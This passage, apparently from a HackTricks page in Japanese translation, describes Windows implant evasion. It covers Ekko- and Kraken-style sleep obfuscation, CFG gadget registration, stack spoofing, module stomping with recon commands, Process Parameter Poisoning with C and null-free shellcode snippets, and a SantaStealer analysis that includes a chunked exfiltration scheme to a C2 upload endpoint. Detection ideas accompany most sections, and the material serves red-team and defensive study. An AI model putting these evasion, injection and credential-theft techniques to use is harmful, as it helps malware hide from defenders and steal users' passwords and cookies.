`Sleep` を patch する代わりに、implant が使用する **実際の wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook する。長時間の wait では、Ekko-style obfuscation chain で call をラップし、idle 中に in-memory image を encrypt する:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使用して、crafted `CONTEXT` frame で `NtContinue` を呼び出す callback sequence を schedule する。
- Typical chain（x64）: image を `PAGE_READWRITE` に設定 → full mapped image に対して `advapi32!SystemFunction032` で RC4 encrypt → blocking wait を実行 → RC4 decrypt → PE section を走査して **section ごとの permission を restore** → completion を signal。
- `RtlCaptureContext` は template `CONTEXT` を提供する。それを複数の frame に clone し、各 step を呼び出すために register（`Rip/Rcx/Rdx/R8/R9`）を設定する。

Operational detail: 長時間の wait（例: `WAIT_OBJECT_0`）に対して “success” を返し、image が masked されている間も caller が継続できるようにする。この pattern は idle window 中に module を scanner から隠し、典型的な “patched `Sleep()`” signature を回避する。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callback の burst。
- 大きく連続した image-size buffer に対する `advapi32!SystemFunction032` の使用。
- 広範囲の `VirtualProtect` の後に custom による section ごとの permission restoration が続く動作。

### sleep-obfuscation gadget の Runtime CFG registration

CFG-enabled target では、`jmp [rbx]` や `jmp rdi` のような mid-function gadget へ初めて indirect jump すると、通常は gadget が module の CFG metadata に存在しないため、`STATUS_STACK_BUFFER_OVERRUN` で process が crash する。hardened process 内で Ekko/Kraken-style chain を維持するには:<sup>[[30]](#references)</sup>

- chain が使用するすべての indirect destination を、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で登録する。
- loaded image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` は **image base** から開始し、**full image size** をカバーする必要がある。
- manually mapped/PIC/stomped region では、代わりに **allocation base** と allocation size を使用する。
- dispatch gadget だけでなく、indirect に到達する export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）と、indirect target になる attacker-controlled executable section も mark する。

これにより、ROP/JOP-style の sleep chain は “non-CFG process でのみ動作するもの” から、`/guard:cf` 付きで compile された `explorer.exe`、browser、`svchost.exe`、その他の endpoint で再利用可能な primitive になる。

### sleeping thread 向け CET-safe stack spoofing

Full `CONTEXT` replacement は noisy であり、spoof された `Rip` が hardware shadow stack と一致しなければならないため、CET Shadow Stack system 上で問題を起こす可能性がある。より安全な sleep-masking pattern は次のとおり:<sup>[[30]](#references)</sup>

- 同じ process 内の別 thread を選び、`NtQueryInformationThread` 経由でその `NT_TIB` / TEB の stack bounds（`StackBase`、`StackLimit`）を読み取る。
- current thread の real TEB/TIB を backup する。
- `GetThreadContext` で real sleeping context を capture する。
- real `Rip` **のみ**を spoof context に copy し、spoofed `Rsp`/stack state はそのままにする。
- sleep window 中、spoof thread の `NT_TIB` を current TEB に copy し、stack walker が legitimate stack range 内で unwind するようにする。
- wait 完了後、original TIB と thread context を restore する。

これにより CET と整合する instruction pointer を維持しながら、TEB stack metadata を信頼して unwind を検証する EDR stack walker を誤誘導できる。

### APC-based alternative: Kraken Mask

timer-queue dispatch が signature として検出されやすい場合、同じ sleep-encrypt-spoof-restore sequence を、queued APC を使用する suspended helper thread から実行できる:<sup>[[27]](#references)</sup>

- entrypoint として `NtTestAlert` を持つ helper thread を作成する。
- `NtQueueApcThread` で準備した `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で drain する。
- default 64 KB thread stack を使い切らないよう、chain state を helper stack ではなく heap に保存する。
- `NtSignalAndWaitForSingleObject` を使用して、start event の signal と block を atomic に行う。
- TIB/context を restore する前に main thread を suspend する（`NtSuspendThread` → restore → `NtResumeThread`）。これにより、scanner が半端に restore された stack を捕捉する race window を縮小する。

これにより、`CreateTimerQueueTimer` + `NtContinue` signature は helper-thread/APC signature に置き換わるが、RC4 masking と stack-spoofing の目的は維持される。

Additional detection ideas
- sleep、wait、または APC dispatch の直前に行われる、`VmCfgCallTargetInformation` を伴う `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、または `ConnectNamedPipe` の前後で wrap される `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` の後に、current thread の TEB/TIB stack bounds へ direct write が行われる動作。
- `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に間接的に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- signed module 内の dispatch pivot として、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）のような短い gadget signature を繰り返し使用する動作。


## Precision Module Stomping

Module stomping は、新しい sacrificial DLL をロードしたり明らかな private executable memory を allocate したりする代わりに、target process 内にすでに mapped されている DLL の **`.text` section** から payload を実行する。overwrite target には、**loaded、disk-backed image** を選ぶべきである。process が引き続き必要とする code path を破壊せずに payload を収容できる code space が必要になるためである。<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

`uxtheme.dll` や `comctl32.dll` のような common module に対する naive な stomping は fragile である。DLL が remote process にロードされていない可能性があり、code region が小さすぎると process が crash する。より reliable な workflow は次のとおり:

1. target process の module を enumerate し、すでに loaded されている DLL の **names-only include list** を保持する。
2. 最初に payload を build し、その **exact byte size** を記録する。
3. disk 上の candidate DLL を scan し、PE section の **`.text` `Misc_VirtualSize`** と payload size を比較する。これは file size より重要である。mapped in memory 時の executable section の size を反映するためである。
4. **Export Address Table (EAT)** を parse し、export された function の RVA を stomp start offset として選択する。
5. **blast radius** を計算する。payload が選択した function boundary を超える場合、memory 内でその後に配置された adjacent export を overwrite する。

Typical recon/selection helper が実環境で確認されている:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
運用上の注意
- リモートプロセスですでに **loaded** されている DLL を優先し、`LoadLibrary` / unexpected image loads による telemetry を回避する。
- target application がほとんど実行しない export を優先する。そうしないと、thread creation の前後に通常の code path が stomped bytes に到達する可能性がある。
- 大規模な implant では、injector source 内で完全な buffer が正しく表現されるよう、shellcode の埋め込みを string literal から **byte-array/braced initializer** に変更する必要がある場合が多い。

検出のアイデア
- より一般的な private RWX/RX allocation ではなく、**image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）への remote write。
- メモリ上の export entry point の bytes が、ディスク上の backing file と一致しなくなっているもの。
- 最初の bytes が最近変更された legitimate DLL export 内から execution を開始する remote thread または context pivot。
- DLL の `.text` pages に対する suspicious な `VirtualProtect(Ex)` / `WriteProcessMemory` の sequence と、その後の thread creation。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、classic な remote write path（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** technique である。すでに実行中の target に bytes をコピーする代わりに、Windows が `CreateProcessW` の startup parameters の一部を child process に **コピー**し、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に保存するという事実を悪用する。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` によってコピーされる Poisonable carriers

有用な carriers は以下のとおり。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` とともに使用）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `lpCommandLine` は `CreateProcessW` に対して **writable memory** を指している必要があり、null terminator を含めて **32,767 Unicode characters** に制限される。
- `lpEnvironment` は、連続する `NAME=VALUE\0` strings で構成され、追加の `\0` で終了する Unicode environment block でなければならない。
- `lpReserved` は公式には reserved であるため、`ShellInfo` mapping は、安定した documented contract ではなく implementation detail として扱うべきである。

これにより、通常の process creation が **payload-transfer primitive** に変わる。operator は attacker-controlled startup data を指定して child process を作成し、Windows に cross-process copy を実行させる。

### Remote write APIs を使用しない Remote lookup flow

child が作成された後、**read-only** primitives を使用してコピーされた buffer を解決する。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. remote `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択した pointer を使用する：
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

最小 flow：
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### コピーした parameter buffer の実行

コピーした parameter region は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. プロセスを通常どおり作成する（suspended にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択した parameter page を実行可能にする
3. `PROCESS_INFORMATION` ですでに返されている main thread handle を再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

classic thread hijacking workflow とは異なり、これは **`SuspendThread` / `ResumeThread` を必要としない**。返された main thread handle に対して直接 context を変更できます。

これにより、injection で一般的に監視される複数の API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も対象

### Null-byte の制限と staged shellcode

3 つの carrier はすべて **string または string-like data** であるため、`0x00` を含む raw payload は transfer 中に切り詰められます。実用的な workaround は、runtime で constants を再構成し、その後任意の second stage を load する **null-free first stage** です。

単純なパターンは、XOR ベースの constant synthesis です。
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
これにより、ファーストステージは、転送されるパラメータに null bytes を埋め込むことなく、スタック文字列、API 引数、DLL パス、またはセカンドステージの shellcode loader を構築できます。

### ファーストステージからのスタックベース API 呼び出し

ファーストステージが `LoadLibraryA` などの API を呼び出す必要がある場合、次の処理を実行できます。

- ターゲットのスタックに文字列/バッファを push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインタを設定する
- 呼び出し前に `RSP` を **16-byte aligned** に保つ

その後、セカンドステージをスタックから `PAGE_READWRITE` allocation にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してから jump できます。これにより、直接的な RWX allocation を回避できます。

### Detection ideas

authors が言及した有効な hunting opportunities:

- **process-parameter pages** を executable にする `VirtualProtectEx` / `NtProtectVirtualMemory`
- その protection change に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` を remote read する処理
- プロセス作成時における、通常より長い、または高エントロピーの `lpCommandLine`、`lpEnvironment`、`STARTUPINFO.lpReserved` の値

### Notes

- P3 は **cross-process transfer trick** であり、それ自体が完全な execution primitive ではありません。コピーされた parameter には、依然として execute-permission change と execution redirection method が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は authors によって検討されましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの suspicious primitives に到達するため、採用されませんでした。

## SantaStealer の Fileless Evasion と Credential Theft の Tradecraft

SantaStealer（別名 BluelineStealer）は、modern info-stealers が AV bypass、anti-analysis、credential access を単一の workflow に組み合わせる方法を示しています。<sup>[[24]](#references)</sup>

### Keyboard layout gating と sandbox delay

- config flag（`anti_cis`）は、`GetKeyboardLayoutList` を使用してインストール済みの keyboard layouts を列挙します。Cyrillic layout が見つかると、sample は空の `CIS` marker を作成して stealers の実行前に terminate します。これにより、除外された locales 上で決して detonate しないようにしつつ、hunting artifact を残します。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 多層化された `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前をカスタムのローリングチェックサムでハッシュ化して、debugger/sandbox 用の埋め込み blocklist と比較します。また、コンピューター名に対してもチェックサムを実行し、`C:\analysis` などの作業ディレクトリを確認します。
- Variant B はシステムプロパティ（プロセス数の下限、直近の uptime）を検査し、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出します。さらに、sleep の前後で timing checks を実行し、single-stepping を検出します。いずれかに該当すると、modules の起動前に中止します。

### Fileless helper + double ChaCha20 reflective loading

- メインの DLL/EXE には Chromium credential helper が埋め込まれており、ディスクに展開するか、メモリ上に手動で map します。fileless mode では imports/relocations を自ら解決するため、helper の痕跡は書き込まれません。
- この helper は、ChaCha20 で二重に暗号化された second-stage DLL（32-byte key 2つ + 12-byte nonce 2つ）を保存します。両方の処理が完了すると、blob を reflectively load（`LoadLibrary` は使用しない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出します。<sup>[[25]](#references)</sup>
- ChromElevator routines は direct-syscall reflective process hollowing を使用して稼働中の Chromium browser に inject し、AppBound Encryption keys を継承します。その後、ABE hardening にもかかわらず、SQLite databases から passwords/cookies/credit cards を直接 decrypt します。


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` function-pointer table を反復処理し、有効な module（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとに1つの thread を生成します。各 thread は共有バッファーに結果を書き込み、約45秒の join window 後に自身の file count を報告します。
- 完了後、すべてのデータは statically linked な `miniz` library によって `%TEMP%\\Log.zip` として zip 化されます。続いて `ThreadPayload1` は15秒 sleep し、archive を10 MB chunks に分割して、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装しながら、HTTP POST で `http://<C2>:6767/upload` に stream します。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加され、最後の chunk には `complete: true` が付加されるため、C2 は reassembly の完了を把握できます。

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
